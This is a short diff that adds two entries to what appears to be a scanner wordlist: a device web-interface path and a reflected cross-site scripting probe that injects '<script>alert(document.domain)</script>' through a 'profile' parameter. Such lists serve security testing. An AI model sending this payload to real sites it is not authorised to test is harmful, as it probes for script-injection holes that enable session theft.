@@ -1,0 +1,2 @@
+/web/guest/en/websys/webArch/header.cgi
+/?profile=</script><script>alert(document.domain)</script>
